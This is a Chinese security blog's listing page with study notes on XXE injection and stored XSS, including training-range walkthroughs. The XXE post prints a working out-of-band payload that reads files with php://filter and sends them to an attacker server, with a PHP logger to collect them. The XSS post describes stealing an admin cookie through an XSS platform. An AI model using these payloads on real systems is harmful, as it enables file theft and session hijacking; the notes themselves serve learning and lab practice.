<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>ALL BLUE</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="ALL BLUE">
<meta property="og:url" content="http://allblue147.github.io/page/3/index.html">
<meta property="og:site_name" content="ALL BLUE">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ALL BLUE">
  
    <link rel="alternative" href="/atom.xml" title="ALL BLUE" type="application/atom+xml">
  
  
    <link rel="icon" href="/http://oayoilchh.bkt.clouddn.com/2016/07/27/18:05:26%20">
  
  
      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
  
    
    
  
  
      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  
  <!-- 加载特效 -->
    <script src="/js/pace.js"></script>
    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
  <script>
      var yiliaConfig = {
          rootUrl: '/',
          fancybox: true,
          animate: true,
          isHome: true,
          isPost: false,
          isArchive: false,
          isTag: false,
          isCategory: false,
          open_in_new: false
      }
  </script>
</head></html>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
        <a href="/" class="profilepic">
            
            <img lazy-src="img/head.jpg" class="js-avatar">
            
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">JYP</a></h1>
        </hgroup>
        
        
            <form>
                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
            </form>
            <div id="local-search-result"></div>
        
        
            <script type="text/javascript">
                (function() {
                    'use strict';
                    function getMatchData(keyword, data) {
                        var matchData = [];
                        for(var i =0;i<data.length;i++){
                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
                                matchData.push(data[i])
                        }
                        return matchData;
                    }
                    var $input = $('#local-search-input');
                    var $resultContent = $('#local-search-result');
                    $input.keyup(function(){
                        $.ajax({
                            url: '/search.json',
                            dataType: "json",
                            success: function( json ) {
                                var str='<ul class=\"search-result-list\">';                
                                var keyword = $input.val().trim().toLowerCase();
                                $resultContent.innerHTML = "";
                                if ($input.val().trim().length <= 0) {
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                }
                                var results = getMatchData(keyword, json);
                                if(results.length === 0){
                                    $resultContent.empty();
                                    $('#switch-area').show();
                                    return;
                                } 
                                for(var i =0; i<results.length; i++){
                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
                                }
                                str += "</ul>";
                                $resultContent.empty();
                                $resultContent.append(str);
                                $('#switch-area').hide();
                            }
                        });
                    });
                })();
            </script>
        
        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        
        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="http://bestwing.me">博客首页</a></li>
                        
                            <li><a href="/archives">文章归档</a></li>
                        
                            <li><a href="/CTFStudy">学习导航</a></li>
                        
                            <li><a href="/PWNABLE">PWNABLE</a></li>
                        
                            <li><a href="/resume">个人简历</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fl mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" title="mail">mail</a>
                            
                                <a class="fl github" target="_blank" href="https://github.com/WinMin" title="github">github</a>
                            
                                <a class="fl zhihu" target="_blank" href="https://www.zhihu.com/people/Swings" title="zhihu">zhihu</a>
                            
                                <a class="fl weibo" target="_blank" href="http://weibo.com/2672317963/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
                            
                                <a class="fl rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                            
                        </ul>
                    </nav>
                </section>
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        
                    </div>
                </section>
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://ring3.xyz/">Yllen</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://mxny.org/">麦香浓郁</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/">K0sh1</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.ycjcl.cc/">信鑫</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://bystudent.com/">ByStundet表哥</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.jarviswang.me/">汪神_Jarvis</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://sh3ll.me/">Chu</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.hackfun.org/">4ido10n</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy">L3m0n</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://o0xmuhe.me/">muhe</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://blog.nuptzj.cn/">_画船听雨</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.virzz.com/index.html">Virink</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.sqlsec.com/">国光</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.bodkin.ren/">老锥</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cizel.cn/">C1zel</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://1phan.cc">1phan</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.liuil.top/">liuil</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/">Ox9A82</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://burnegg.com/">burnegg</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://jwrsec.cn/">jwr-sec</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://sudalover.cn/">苏打</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://blog.binklac.com">VeroFess</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.bendawang.site/">bendawang</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://weeklyalgo.codes/">hook</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.flier.net.cn/">Flier&#39;blog</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.mutepig.club">mutepig</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://blog.iret.xyz/list.aspx">Silver</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://simp1e.leanote.com/">Simple</a>
                    
                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://processor.pub/">Processor</a>
                    
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">一只淹死在二进制海洋里的二进制狗</div>
                </section>
                
            </div>
        </div>
    </header>
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">JYP</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                
                    <img lazy-src="/img/head.jpg" class="js-avatar">
                
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="Me">JYP</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="http://bestwing.me">博客首页</a></li>
                
                    <li><a href="/archives">文章归档</a></li>
                
                    <li><a href="/CTFStudy">学习导航</a></li>
                
                    <li><a href="/PWNABLE">PWNABLE</a></li>
                
                    <li><a href="/resume">个人简历</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                <div class="social">
                    
                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" title="mail">mail</a>
                    
                        <a class="github" target="_blank" href="https://github.com/WinMin" title="github">github</a>
                    
                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/Swings" title="zhihu">zhihu</a>
                    
                        <a class="weibo" target="_blank" href="http://weibo.com/2672317963/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
                    
                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
                    
                </div>
            </nav>
        </header>                
    </div>
</nav>
      <div class="body-wrap">
  
    <article id="post-XXE-实体注入" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/XXE-实体注入/" class="article-date">
      <time datetime="2019-12-06T17:03:10.477Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/XXE-实体注入/">XXE-实体注入</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="XXE介绍"><a href="#XXE介绍" class="headerlink" title="XXE介绍"></a>XXE介绍</h2><p><strong>XXE即外部实体，从安全角度理解为XML外部实体注入攻击</strong></p>
<p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
<p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cwsvo56lj30xq0fvwiv.jpg" alt></p>
<p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
<h4 id="内部DTD声明"><a href="#内部DTD声明" class="headerlink" title="内部DTD声明:"></a>内部DTD声明:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>
<p><strong>实例：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="引用外部DTD声明"><a href="#引用外部DTD声明" class="headerlink" title="引用外部DTD声明:"></a>引用外部DTD声明:</h4><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p>
<p>或者</p>
<p><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; &quot;文件名&quot;&gt;s</code></p>
<p><strong>实例</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure></p>
<p>这是包含 DTD 的 “note.dtd” 文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
<p>实体引用是对实体的引用。</p>
<p>实体可在内部或外部进行声明。</p>
<h3 id="1-一个外部实体声明"><a href="#1-一个外部实体声明" class="headerlink" title="1. 一个外部实体声明"></a>1. <strong>一个外部实体声明</strong></h3><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>DTD 例子:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>XML 例子:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-一个内部实体声明"><a href="#2-一个内部实体声明" class="headerlink" title="2. 一个内部实体声明"></a>2. <strong>一个内部实体声明</strong></h3><p>语法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>DTD 例子:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>XML 例子:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
<p><strong>实体又分为一般实体和参数实体:</strong></p>
<ul>
<li>一般实体的声明语法:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 “实体内容“&gt;</span><br></pre></td></tr></table></figure>
<p>引用实体的方式：&amp;实体名；</p>
<ul>
<li>参数实体只能在DTD中使用，参数实体的声明格式： </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名 “实体内容“&gt;</span><br></pre></td></tr></table></figure>
<p>引用实体的方式：%实体名；</p>
<p><strong>一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</strong></p>
<p><strong>简单XXE攻击payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test=&apos;&lt;!DOCTYPE scan [&lt;!ENTITY test SYSTEM &quot;file:///c:/1.txt&quot;&gt;]&gt;&lt;scan&gt;&amp;test;&lt;/scan&gt;&apos;;</span><br><span class="line">$obj=simplexml_load_string($test,&apos;SimpleXMLElement&apos;,LIBXML_NOENT);</span><br><span class="line">print_r($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>test是一个变量，里面是XML，访问读取了C盘的1.txt然后使用simplexml_load_string将其转换为对象打印出来</strong></p>
<h2 id="simplexml-load-string-函数"><a href="#simplexml-load-string-函数" class="headerlink" title="simplexml_load_string()函数"></a>simplexml_load_string()函数</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>把 XML 字符串载入对象中</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">simplexml_load_string(_data,classname,options,ns,is_prefix_ );</span><br></pre></td></tr></table></figure>
<p>第一个参数是xml语句，SimpleXMLElement是调用了SimpleXMlement这个类，然后LIBXML_NOET是代替实体，然后去调用文件c盘下1.txt。</p>
<p>在实战中后端语言解析了XML是不会输出读取内容的，我们需要一个类似接受平台的接收器，将XML读取的数据发送到接收平台，然后接受平台储存然后我们在接受平台上分析。先<strong>使用PHP伪协议读取文件：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/1.txt&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>然后<strong>去调用 用来XXE的服务器中的一个xml文档文件：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://1.1.1.1/1.xml&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>而这个XML写的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://1.1.1.1:8080/2.php?</span><br><span class="line">id=%file;&apos;&gt;&quot;</span><br><span class="line">\&gt;</span><br><span class="line">%all;      //调用实体</span><br></pre></td></tr></table></figure>
<p><strong>1.XML文档会调用2.php文件并向id通过GET方式传入%file 读取的内容</strong><br>而2.php的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&apos;id&apos;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure>
<p>2.php被调用后会将id传进来的参数即%file的内容写入到3.php中，我们就可以通过访问3.php得到我们想读取的内容；</p>
<h2 id="靶场演示"><a href="#靶场演示" class="headerlink" title="靶场演示"></a>靶场演示</h2><p><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz0zbfttj31h00qm758.jpg" alt><br>进入XXE靶场（外部实体注入），我们发现了<strong>simplexml_load_string()函数</strong>，这里很可能有XXE漏洞，我们看了下附件代码件：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz1dhaqqj317w0npwn1.jpg" alt><br>发现这里通过$poststr接收数据并将数据直接放入到simplexml_load_string()转换为对象，那这里是可以进行XXE的；</p>
<p>我们先构造出XXE的poc代码：<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz1pp4y0j313v05lt9p.jpg" alt><br>第三行是通过php伪协议去读取<strong>被攻击服务器</strong>下的<strong>flag.php</strong>文件内容（base64编码，方便数据传输）</p>
<p>第四行是通过外部实体声明加载<strong>攻击者服务器</strong>的<strong>1.xml</strong>文件</p>
<p>第五行调用外部实体remote</p>
<p>第六行调用外部实体send</p>
<p><strong>1.xml</strong>文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://1.1.1.1:8080/xxe/2.php?id=%file;&apos;&gt;&quot;</span><br><span class="line"> \&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
<p><strong>调用2.php并传入参数</strong></p>
<p><strong>2.php内容如下：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&apos;id&apos;],FILE_APPEND);?&gt;</span><br></pre></td></tr></table></figure>
<p>将传参的内容，即读取到的文件写入放到3.txt中，成功读取文件</p>
<p>抓包，通过POST方式上传<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz21z8wsj31h60ra0y4.jpg" alt><br>访问攻击者（即自己）的服务器，看看3.txt是否收到读取的文件<br><img src="https://tva1.sinaimg.cn/large/007rAy9hgy1g3cz2cygdgj31h30psdfu.jpg" alt><br>成功读取到文件，因为之前对其进行base64编码，所以进行base64解码即可得到原来的内容！</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-XSS2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/XSS2/" class="article-date">
      <time datetime="2019-12-06T17:03:10.473Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/XSS2/">存储型XSS</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>XSS(跨站脚本攻击)的原理其实我已经在上篇文章说过了，所以我就不详细解释了，我们就说说xss漏洞的两大根本条件：</p>
<ul>
<li>用户要能控制输入，</li>
<li>原本程序要执行的html代码，拼接了用户输入的数据</li>
</ul>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>指嵌入web页面的恶意html代码被存进了应用服务器端去，也就是说被存储到数据库中去，在每次有人访问这个页面，都会自动触发恶意代码，并且能够持续的攻击用户，所以也称为持久型；</p>
<p>我们通常是通过一个弹窗去检验是否存在XSS,如果有XSS漏洞，我们通常会使用XSS平台去获取对方cookie，网上XSS平台其实有很多，自行搜索即可；</p>
<h3 id="存储型XSS可能触发的地方"><a href="#存储型XSS可能触发的地方" class="headerlink" title="存储型XSS可能触发的地方"></a>存储型XSS可能触发的地方</h3><ul>
<li>任何可以插入到数据库的地方</li>
<li>注册提交框</li>
<li>留言板</li>
<li>上传文件的文件名</li>
<li>报错日志信息(管理员可见)<br>……</li>
</ul>
<p>我们通过<a href="http://117.41.229.122:8004/Feedback.asp" target="_blank" rel="noopener">掌控安全公开课靶场</a>为例：<br>我们点击网页一看，看见有个留言板，那我们在想这里会不会有没有xss?<br>我们通过弹窗去测试有没有XSS漏洞：</p>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/7*uFk3MvsKFG57tovZNgRkkCqVvvqiRXK7Cg.PzBVHo!/b/dMAAAAAAAAAA&amp;bo=swTKAwAAAAADJ3w!&amp;rf=viewer_4" alt></p>
<p>发现出现弹窗</p>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/Jc8TcgJNtMElfIS6K0NoUpudHzE6xCirF8XnLuQStHY!/b/dFMBAAAAAAAA&amp;bo=dgQ9AQAAAAADF3w!&amp;rf=viewer_4" alt></p>
<p>我们发现我们输入的代码已经被插入html代码块里面去了</p>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/wMq3UQ0gc93UieaE5eIkqd2UWTNL*5d2oCrytVsRng4!/b/dAgBAAAAAAAA&amp;bo=yQHFAAAAAAADFz8!&amp;rf=viewer_4" alt></p>
<p>因为XSS payload代码复杂，所以我们通常是使用xss平台去获取cookie<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/JoeGc63sW7v3Qz1e4O7F0yJIUboQItBj7hn2Ls9zYks!/b/dLYAAAAAAAAA&amp;bo=1gbGAQAAAAADFyU!&amp;rf=viewer_4" alt></p>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/8XKbLcqw40gOT5tuCQDQ3asbNCMMrPwn1g1GO4xbf*A!/b/dL8AAAAAAAAA&amp;bo=uQVmAwAAAAADF.s!&amp;rf=viewer_4" alt></p>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/2LotA1LS9E1m5Ra1m3X15yDrDTYZqJmezvdQJ.BjnHs!/b/dDcBAAAAAAAA&amp;bo=MQU*AwAAAAADFzo!&amp;rf=viewer_4" alt></p>
<p>我们将平台上的payload复制，插入到有xss漏洞的留言框去<br><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/zsEOEET*L*0nIJ1hX1LePGgHNif.mbwTuOyRFNYFx.c!/b/dFYBAAAAAAAA&amp;bo=egMuAwAAAAADF2Y!&amp;rf=viewer_4" alt></p>
<p>插入成功后，我们查看xss平台，成功拿到管理员cookie</p>
<p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/U5uylpL*PqLh2*jjkg1FVvjQZ8*NMIB*b10X78I1hFA!/b/dMIAAAAAAAAA&amp;bo=swRbAgAAAAADF9w!&amp;rf=viewer_4" alt></p>
<p><strong>其实xss漏洞出现在留言框上，还可能出现在上传文件名或注册页面框等与插入数据库的提交框上，我们可以通过js弹窗进行测试！</strong></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/笔记/">笔记</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-xss1" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/xss1/" class="article-date">
      <time datetime="2019-12-06T17:03:10.469Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/xss1/">xss原理与分析</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="XSS编码绕过-浏览器的解析顺序："><a href="#XSS编码绕过-浏览器的解析顺序：" class="headerlink" title="XSS编码绕过-浏览器的解析顺序："></a>XSS编码绕过-浏览器的解析顺序：</h2><ul>
<li>浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别哪些被实体编码的内容的，只有建立起DOM 树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码。</li>
</ul>
<p><strong>基本的解析顺序</strong>是-&gt;URL 解析，HTML 解析， CSS 解析，JS解析;</p>
